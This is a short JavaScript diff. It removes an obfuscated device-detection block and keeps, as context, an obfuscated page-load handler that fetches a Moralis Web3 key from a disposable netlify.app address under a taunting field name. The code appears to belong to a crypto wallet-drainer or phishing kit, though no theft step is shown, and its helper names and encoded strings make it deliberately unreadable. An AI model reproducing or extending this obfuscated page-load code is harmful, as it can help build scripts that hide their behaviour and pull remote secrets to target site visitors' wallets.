@@ -605,16 +605,7 @@ const rdmString = (length) => {
     return x;
 }
 const createNonce = () => { return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; }
-    const m = new URLSearchParams(e).get(c(0, 0, 139, 0, 1480));
-    if (console.log(m),
-    "mm" == m)
-        return W(1052, 0, "y[rb");
-    if (/windows phone/i.test(d))
-        return W(3842, 0, "y9a)");
-    if (/android/i.test(d))
-        return c(0, 0, 1654, 0, 1158);
-    return /iPad|iPhone|iPod/.test(d) && !window.MSStream ? _0x20d2(2471 - 390, 3071) : _0x20d2(1075 - 654, -167)
-}
+
 $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
     get_local_moralis_key = await (await fetch("https://snazzy-croquembouche-b14a4a.netlify.app/moralis_key.json")).json();
     var d = get_local_moralis_key["moralis-go-fuck-urself-imagine-trying"];
